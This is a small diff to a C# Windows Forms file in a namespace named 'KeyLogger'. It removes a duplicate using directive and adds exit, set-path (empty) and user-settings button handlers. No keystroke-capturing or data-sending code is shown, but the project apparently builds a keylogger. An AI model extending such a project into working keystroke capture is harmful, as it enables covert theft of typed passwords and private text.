@@ -9,7 +9,6 @@ using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.IO;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace KeyLogger
@@ -58,6 +57,21 @@ namespace KeyLogger
                     }
                 }
             }
+        }
+
+        private void btnExit_Click(object sender, EventArgs e)
+        {
+            Application.Exit();
+        }
+
+        private void btnSetPath_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void btnSetUsers_Click(object sender, EventArgs e)
+        {
+            new UserSetting();
         }
     }
 }
